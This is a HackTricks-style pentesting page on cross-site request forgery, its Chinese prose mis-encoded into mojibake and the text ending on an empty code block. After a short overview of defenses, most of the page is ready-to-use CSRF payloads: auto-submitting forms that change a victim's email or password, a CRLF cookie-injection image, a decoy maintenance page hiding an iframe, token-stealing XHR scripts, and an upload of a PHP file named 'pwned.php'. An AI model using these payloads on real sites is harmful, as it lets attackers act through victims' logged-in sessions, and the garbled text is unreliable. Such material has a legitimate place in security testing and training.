# CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

- å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
- è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
- æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
- **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
- é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œèµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€å’ŒæŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£åŠæ—¶äº†è§£å¿«èŠ‚å¥çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
éšæ—¶äº†è§£æœ€æ–°çš„èµé‡‘è®¡åˆ’å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬çš„** [**Discord**](https://discord.com/invite/N3FrSbmwdy) å¹¶å¼€å§‹ä¸é¡¶å°–é»‘å®¢åˆä½œï¼

## è§£é‡Šè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰

**è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰**æ˜¯ä¸€ç§åœ¨Webåº”ç”¨ç¨‹åºä¸­å‘ç°çš„å®‰å…¨æ¼æ´ç±»å‹ã€‚å®ƒä½¿æ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨å—å®³è€…çš„å·²éªŒè¯ä¼šè¯ï¼Œä»£è¡¨æ¯«ä¸çŸ¥æƒ…çš„ç”¨æˆ·æ‰§è¡Œæ“ä½œã€‚å½“å·²ç™»å½•å—å®³è€…å¹³å°çš„ç”¨æˆ·è®¿é—®æ¶æ„ç«™ç‚¹æ—¶ï¼Œæ”»å‡»å°±ä¼šæ‰§è¡Œã€‚ç„¶åï¼Œè¯¥ç«™ç‚¹é€šè¿‡æ‰§è¡ŒJavaScriptã€æäº¤è¡¨å•æˆ–è·å–å›¾åƒç­‰æ–¹æ³•è§¦å‘å¯¹å—å®³è€…å¸æˆ·çš„è¯·æ±‚ã€‚

### CSRFæ”»å‡»çš„å…ˆå†³æ¡ä»¶

è¦åˆ©ç”¨CSRFæ¼æ´ï¼Œå¿…é¡»æ»¡è¶³å‡ ä¸ªæ¡ä»¶ï¼š

1. **è¯†åˆ«æœ‰ä»·å€¼çš„æ“ä½œ**ï¼šæ”»å‡»è€…éœ€è¦æ‰¾åˆ°å€¼å¾—åˆ©ç”¨çš„æ“ä½œï¼Œä¾‹å¦‚æ›´æ”¹ç”¨æˆ·çš„å¯†ç ã€ç”µå­é‚®ä»¶æˆ–æå‡æƒé™ã€‚
2. **ä¼šè¯ç®¡ç†**ï¼šç”¨æˆ·çš„ä¼šè¯åº”ä»…é€šè¿‡Cookieæˆ–HTTPåŸºæœ¬èº«ä»½éªŒè¯æ ‡å¤´è¿›è¡Œç®¡ç†ï¼Œå› ä¸ºå…¶ä»–æ ‡å¤´æ— æ³•ç”¨äºæ­¤ç›®çš„è¿›è¡Œæ“çºµã€‚
3. **æ— æ³•é¢„æµ‹çš„å‚æ•°**ï¼šè¯·æ±‚ä¸åº”åŒ…å«æ— æ³•é¢„æµ‹çš„å‚æ•°ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¼šé˜»æ­¢æ”»å‡»ã€‚

### å¿«é€Ÿæ£€æŸ¥

æ‚¨å¯ä»¥**åœ¨Burpä¸­æ•è·è¯·æ±‚**å¹¶æ£€æŸ¥CSRFä¿æŠ¤ï¼Œå¹¶åœ¨æµè§ˆå™¨ä¸­æµ‹è¯•æ—¶ï¼Œå¯ä»¥å•å‡»**å¤åˆ¶ä¸ºfetch**å¹¶æ£€æŸ¥è¯·æ±‚ï¼š

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### é˜²å¾¡CSRFæ”»å‡»

å¯ä»¥å®æ–½å¤šç§å¯¹æŠ—æªæ–½æ¥é˜²èŒƒCSRFæ”»å‡»ï¼š

- [**SameSite cookies**](hacking-with-cookies/#samesite)ï¼šæ­¤å±æ€§å¯é˜²æ­¢æµè§ˆå™¨éšè·¨ç«™è¯·æ±‚å‘é€Cookieã€‚[äº†è§£æ›´å¤šå…³äºSameSite cookiesçš„ä¿¡æ¯](hacking-with-cookies/#samesite)ã€‚
- [**è·¨åŸŸèµ„æºå…±äº«**](cors-bypass.md)ï¼šå—å®³ç«™ç‚¹çš„CORSç­–ç•¥å¯èƒ½å½±å“æ”»å‡»çš„å¯è¡Œæ€§ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ”»å‡»éœ€è¦è¯»å–å—å®³ç«™ç‚¹çš„å“åº”ã€‚[äº†è§£æœ‰å…³CORSç»•è¿‡çš„ä¿¡æ¯](cors-bypass.md)ã€‚
- **ç”¨æˆ·éªŒè¯**ï¼šæç¤ºç”¨æˆ·è¾“å…¥å¯†ç æˆ–è§£å†³éªŒè¯ç å¯ä»¥ç¡®è®¤ç”¨æˆ·çš„æ„å›¾ã€‚
- **æ£€æŸ¥å¼•ç”¨è€…æˆ–æ¥æºæ ‡å¤´**ï¼šéªŒè¯è¿™äº›æ ‡å¤´å¯ä»¥å¸®åŠ©ç¡®ä¿è¯·æ±‚æ¥è‡ªå—ä¿¡ä»»çš„æ¥æºã€‚ä½†æ˜¯ï¼Œç²¾å¿ƒæ„é€ URLå¯èƒ½ä¼šç»•è¿‡å®æ–½ä¸è‰¯çš„æ£€æŸ¥ï¼Œä¾‹å¦‚ï¼š
  - ä½¿ç”¨`http://mal.net?orig=http://example.com`ï¼ˆURLä»¥å—ä¿¡ä»»çš„URLç»“å°¾ï¼‰
  - ä½¿ç”¨`http://example.com.mal.net`ï¼ˆURLä»¥å—ä¿¡ä»»çš„URLå¼€å¤´ï¼‰
- **ä¿®æ”¹å‚æ•°åç§°**ï¼šæ›´æ”¹POSTæˆ–GETè¯·æ±‚ä¸­çš„å‚æ•°åç§°å¯ä»¥å¸®åŠ©é˜²æ­¢è‡ªåŠ¨åŒ–æ”»å‡»ã€‚
- **CSRFä»¤ç‰Œ**ï¼šåœ¨æ¯ä¸ªä¼šè¯ä¸­åŠ å…¥å”¯ä¸€çš„CSRFä»¤ç‰Œï¼Œå¹¶è¦æ±‚åœ¨åç»­è¯·æ±‚ä¸­ä½¿ç”¨æ­¤ä»¤ç‰Œï¼Œå¯ä»¥æ˜¾è‘—å‡è½»CSRFçš„é£é™©ã€‚é€šè¿‡å¼ºåˆ¶æ‰§è¡ŒCORSå¯ä»¥å¢å¼ºä»¤ç‰Œçš„æœ‰æ•ˆæ€§ã€‚

ç†è§£å¹¶å®æ–½è¿™äº›é˜²å¾¡æªæ–½å¯¹äºç»´æŠ¤Webåº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§è‡³å…³é‡è¦ã€‚

## é˜²å¾¡ç»•è¿‡

### ä»POSTåˆ°GET

ä¹Ÿè®¸æ‚¨æƒ³è¦æ»¥ç”¨çš„è¡¨å•å‡†å¤‡å‘é€**å¸¦æœ‰CSRFä»¤ç‰Œçš„POSTè¯·æ±‚**ï¼Œä½†æ˜¯ï¼Œæ‚¨åº”è¯¥**æ£€æŸ¥**æ˜¯å¦**GET**ä¹Ÿæ˜¯**æœ‰æ•ˆçš„**ï¼Œä»¥åŠå½“æ‚¨å‘é€GETè¯·æ±‚æ—¶**CSRFä»¤ç‰Œæ˜¯å¦ä»åœ¨éªŒè¯**ã€‚

### ç¼ºå°‘ä»¤ç‰Œ

åº”ç”¨ç¨‹åºå¯èƒ½ä¼šå®æ–½ä¸€ç§æœºåˆ¶ï¼Œåœ¨å‡ºç°ä»¤ç‰Œæ—¶**éªŒè¯ä»¤ç‰Œ**ã€‚ä½†æ˜¯ï¼Œå¦‚æœåœ¨ä»¤ç‰Œä¸å­˜åœ¨æ—¶å®Œå…¨è·³è¿‡éªŒè¯ï¼Œåˆ™ä¼šå‡ºç°æ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡**åˆ é™¤æºå¸¦ä»¤ç‰Œçš„å‚æ•°**ï¼ˆè€Œä¸ä»…ä»…æ˜¯å…¶å€¼ï¼‰æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚è¿™ä½¿ä»–ä»¬å¯ä»¥è§„é¿éªŒè¯è¿‡ç¨‹å¹¶æœ‰æ•ˆåœ°æ‰§è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»ã€‚

### CSRFä»¤ç‰Œæœªç»‘å®šåˆ°ç”¨æˆ·ä¼šè¯

æœªå°†CSRFä»¤ç‰Œç»‘å®šåˆ°ç”¨æˆ·ä¼šè¯çš„åº”ç”¨ç¨‹åºå­˜åœ¨é‡å¤§**å®‰å…¨é£é™©**ã€‚è¿™äº›ç³»ç»Ÿä¼šæ ¹æ®**å…¨å±€æ± **éªŒè¯ä»¤ç‰Œï¼Œè€Œä¸æ˜¯ç¡®ä¿æ¯ä¸ªä»¤ç‰Œä¸å‘èµ·ä¼šè¯ç»‘å®šã€‚

ä»¥ä¸‹æ˜¯æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨è¿™ä¸€ç‚¹çš„æ–¹æ³•ï¼š

1. ä½¿ç”¨è‡ªå·±çš„å¸æˆ·è¿›è¡Œ**èº«ä»½éªŒè¯**ã€‚
2. ä»å…¨å±€æ± ä¸­**è·å–æœ‰æ•ˆçš„CSRFä»¤ç‰Œ**ã€‚
3. ä½¿ç”¨æ­¤ä»¤ç‰Œ**å¯¹å—å®³è€…è¿›è¡ŒCSRFæ”»å‡»**ã€‚

æ­¤æ¼æ´å…è®¸æ”»å‡»è€…ä»£è¡¨å—å®³è€…è¿›è¡Œæœªç»æˆæƒçš„è¯·æ±‚ï¼Œåˆ©ç”¨åº”ç”¨ç¨‹åºçš„**ä¸è¶³çš„ä»¤ç‰ŒéªŒè¯æœºåˆ¶**ã€‚

### æ–¹æ³•ç»•è¿‡

å¦‚æœè¯·æ±‚ä½¿ç”¨äº†ä¸€ä¸ªâ€œ**å¥‡æ€ª**â€çš„**æ–¹æ³•**ï¼Œè¯·æ£€æŸ¥**æ–¹æ³•****è¦†ç›–åŠŸèƒ½**æ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨äº†**PUT**æ–¹æ³•ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**POST**æ–¹æ³•å¹¶å‘é€ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å‘é€**\_methodå‚æ•°**æˆ–ä½¿ç”¨ä»¥ä¸‹**æ ‡å¤´**æ¥å®ç°ï¼š

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### è‡ªå®šä¹‰æ ‡å¤´ä»¤ç‰Œç»•è¿‡

å¦‚æœè¯·æ±‚åœ¨è¯·æ±‚ä¸­æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰**ä»¤ç‰Œ**çš„**è‡ªå®šä¹‰æ ‡å¤´**ä½œä¸º**CSRFä¿æŠ¤æ–¹æ³•**ï¼Œé‚£ä¹ˆï¼š

- åœ¨æ²¡æœ‰**è‡ªå®šä¹‰ä»¤ç‰Œå’Œæ ‡å¤´**çš„æƒ…å†µä¸‹æµ‹è¯•è¯·æ±‚ã€‚
- ä½¿ç”¨**å®Œå…¨ç›¸åŒé•¿åº¦ä½†ä¸åŒä»¤ç‰Œ**æµ‹è¯•è¯·æ±‚ã€‚

### é€šè¿‡CookieéªŒè¯CSRFä»¤ç‰Œ

åº”ç”¨ç¨‹åºå¯èƒ½é€šè¿‡åœ¨Cookieå’Œè¯·æ±‚å‚æ•°ä¸­å¤åˆ¶ä»¤ç‰Œæˆ–è®¾ç½®CSRF Cookieå¹¶éªŒè¯åç«¯å‘é€çš„ä»¤ç‰Œæ¥å®ç°CSRFä¿æŠ¤ã€‚åº”ç”¨ç¨‹åºé€šè¿‡æ£€æŸ¥è¯·æ±‚å‚æ•°ä¸­çš„ä»¤ç‰Œæ˜¯å¦ä¸Cookieä¸­çš„å€¼å¯¹é½æ¥éªŒè¯è¯·æ±‚ã€‚

ä½†æ˜¯ï¼Œå¦‚æœç½‘ç«™å­˜åœ¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨å—å®³è€…çš„æµè§ˆå™¨ä¸­è®¾ç½®CSRF Cookieï¼Œä¾‹å¦‚CRLFæ¼æ´ï¼Œé‚£ä¹ˆæ­¤æ–¹æ³•å®¹æ˜“å—åˆ°CSRFæ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡åŠ è½½è®¾ç½®Cookieçš„æ¬ºéª—æ€§å›¾åƒï¼Œç„¶åå‘èµ·CSRFæ”»å‡»æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚

ä»¥ä¸‹æ˜¯æ”»å‡»å¯èƒ½æ„å»ºçš„ç¤ºä¾‹ï¼š
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**csrfä»¤ç‰Œä¸ä¼šè¯cookieç›¸å…³è”ï¼Œåˆ™æ­¤æ”»å‡»å°†æ— æ•ˆ**ï¼Œå› ä¸ºæ‚¨å°†éœ€è¦å‘å—å®³è€…è®¾ç½®æ‚¨çš„ä¼šè¯ï¼Œå› æ­¤æ‚¨å°†æ”»å‡»è‡ªå·±ã€‚
{% endhint %}

### æ›´æ”¹å†…å®¹ç±»å‹

æ ¹æ®[**æ­¤å¤„**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ï¼Œä¸ºäº†**é¿å…é¢„æ£€è¯·æ±‚**ä½¿ç”¨**POST**æ–¹æ³•ï¼Œè¿™äº›æ˜¯å…è®¸çš„Content-Typeå€¼ï¼š

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œ**æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ**å–å†³äºä½¿ç”¨çš„**Content-Type**ï¼Œå› æ­¤æ‚¨åº”è¯¥å°è¯•æåˆ°çš„å€¼å’Œå…¶ä»–å€¼ï¼Œå¦‚**`application/json`**_**,**_**`text/xml`**ï¼Œ**`application/xml`**_._

å‘é€JSONæ•°æ®ä½œä¸ºtext/plainçš„ç¤ºä¾‹ï¼ˆæ¥è‡ª[æ­¤å¤„](https://brycec.me/posts/corctf\_2021\_challenges)ï¼‰ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### ç»•è¿‡é¢„æ£€è¯·æ±‚ä»¥è·å–JSONæ•°æ®

åœ¨å°è¯•é€šè¿‡POSTè¯·æ±‚å‘é€JSONæ•°æ®æ—¶ï¼Œåœ¨HTMLè¡¨å•ä¸­ä½¿ç”¨ `Content-Type: application/json` æ˜¯ä¸ç›´æ¥å¯èƒ½çš„ã€‚åŒæ ·ï¼Œåˆ©ç”¨ `XMLHttpRequest` å‘é€æ­¤å†…å®¹ç±»å‹ä¼šå¯åŠ¨ä¸€ä¸ªé¢„æ£€è¯·æ±‚ã€‚å°½ç®¡å¦‚æ­¤ï¼Œä»ç„¶æœ‰ç­–ç•¥å¯ä»¥æ½œåœ¨åœ°ç»•è¿‡è¿™ç§é™åˆ¶ï¼Œå¹¶æ£€æŸ¥æœåŠ¡å™¨æ˜¯å¦å¤„ç†JSONæ•°æ®ï¼Œè€Œä¸è€ƒè™‘Content-Typeï¼š

1. **ä½¿ç”¨æ›¿ä»£å†…å®¹ç±»å‹**ï¼šé€šè¿‡åœ¨è¡¨å•ä¸­è®¾ç½® `enctype="text/plain"`ï¼Œä½¿ç”¨ `Content-Type: text/plain` æˆ– `Content-Type: application/x-www-form-urlencoded`ã€‚è¿™ç§æ–¹æ³•æµ‹è¯•åç«¯æ˜¯å¦ä½¿ç”¨æ•°æ®ï¼Œè€Œä¸è€ƒè™‘Content-Typeã€‚
2. **ä¿®æ”¹å†…å®¹ç±»å‹**ï¼šä¸ºäº†é¿å…é¢„æ£€è¯·æ±‚ï¼ŒåŒæ—¶ç¡®ä¿æœåŠ¡å™¨å°†å†…å®¹è¯†åˆ«ä¸ºJSONï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ `Content-Type: text/plain; application/json` å‘é€æ•°æ®ã€‚è¿™ä¸ä¼šè§¦å‘é¢„æ£€è¯·æ±‚ï¼Œä½†å¦‚æœæœåŠ¡å™¨é…ç½®ä¸ºæ¥å— `application/json`ï¼Œåˆ™å¯èƒ½ä¼šè¢«æ­£ç¡®å¤„ç†ã€‚
3. **SWF Flashæ–‡ä»¶åˆ©ç”¨**ï¼šä¸€ç§è¾ƒä¸å¸¸è§ä½†å¯è¡Œçš„æ–¹æ³•æ¶‰åŠä½¿ç”¨SWF Flashæ–‡ä»¶æ¥ç»•è¿‡æ­¤ç±»é™åˆ¶ã€‚è¦æ·±å…¥äº†è§£æ­¤æŠ€æœ¯ï¼Œè¯·å‚è€ƒ[æ­¤æ–‡ç« ](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã€‚

### ç»•è¿‡å¼•ç”¨è€…/æ¥æºæ£€æŸ¥

**é¿å…å¼•ç”¨è€…å¤´éƒ¨**

åº”ç”¨ç¨‹åºå¯èƒ½ä»…åœ¨å­˜åœ¨æ—¶éªŒè¯ 'Referer' å¤´éƒ¨ã€‚ä¸ºäº†é˜²æ­¢æµè§ˆå™¨å‘é€æ­¤å¤´éƒ¨ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹HTML metaæ ‡ç­¾ï¼š
```xml
<meta name="referrer" content="never">
```
è¿™æ ·å¯ä»¥ç¡®ä¿çœç•¥â€œRefererâ€æ ‡å¤´ï¼Œä»è€Œå¯èƒ½ç»•è¿‡æŸäº›åº”ç”¨ç¨‹åºä¸­çš„éªŒè¯æ£€æŸ¥ã€‚

**æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

è¦åœ¨URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œä»¥ä¾¿Referrerå°†å…¶å‘é€åˆ°å‚æ•°å†…ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADæ–¹æ³•ç»•è¿‡**

[**è¿™ç¯‡CTFè§£å¯†**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)çš„ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†[Oakçš„æºä»£ç ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸º**å°†HEADè¯·æ±‚å¤„ç†ä¸ºGETè¯·æ±‚**ï¼Œä¸”ä¸è¿”å›å“åº”ä½“ - è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„è§£å†³æ–¹æ³•ï¼Œä¸ä»…ä»…é€‚ç”¨äºOakã€‚ä¸å¤„ç†HEADè¯·æ±‚çš„ç‰¹å®šå¤„ç†ç¨‹åºä¸åŒï¼Œå®ƒä»¬**åªæ˜¯äº¤ç»™GETå¤„ç†ç¨‹åºï¼Œä½†åº”ç”¨ç¨‹åºä¼šåˆ é™¤å“åº”ä½“**ã€‚

å› æ­¤ï¼Œå¦‚æœGETè¯·æ±‚å—é™ï¼Œæ‚¨å¯ä»¥**å‘é€ä¸€ä¸ªå°†è¢«å¤„ç†ä¸ºGETè¯·æ±‚çš„HEADè¯·æ±‚**ã€‚

## **åˆ©ç”¨ç¤ºä¾‹**

### **çªƒå–CSRFä»¤ç‰Œ**

å¦‚æœæ­£åœ¨ä½¿ç”¨**CSRFä»¤ç‰Œ**ä½œä¸º**é˜²å¾¡**ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡[XSS](xss-cross-site-scripting/#xss-stealing-csrf-tokens)æ¼æ´æˆ–[æ‚¬æŒ‚æ ‡è®°](dangling-markup-html-scriptless-injection/)æ¼æ´**çªƒå–å®ƒ**ã€‚

### **ä½¿ç”¨HTMLæ ‡ç­¾è¿›è¡ŒGETè¯·æ±‚**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
å…¶ä»–å¯ä»¥ç”¨æ¥è‡ªåŠ¨å‘é€GETè¯·æ±‚çš„HTML5æ ‡ç­¾æœ‰ï¼š
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### è¡¨å•GETè¯·æ±‚
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### è¡¨å•POSTè¯·æ±‚
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### é€šè¿‡ iframe å‘é€è¡¨å• POST è¯·æ±‚
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST è¯·æ±‚**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST è¯·æ±‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST è¯·æ±‚ v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### ä»iframeå†…éƒ¨å‘èµ·è¡¨å•POSTè¯·æ±‚
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶å‘é€ POST è¯·æ±‚**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframeã€è¡¨å•å’Œ Ajax å‘é€ Post è¯·æ±‚**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **çªƒå– CSRF ä»¤ç‰Œå¹¶ä½¿ç”¨ iframe å’Œè¡¨å•å‘é€ POST è¯·æ±‚**
```html
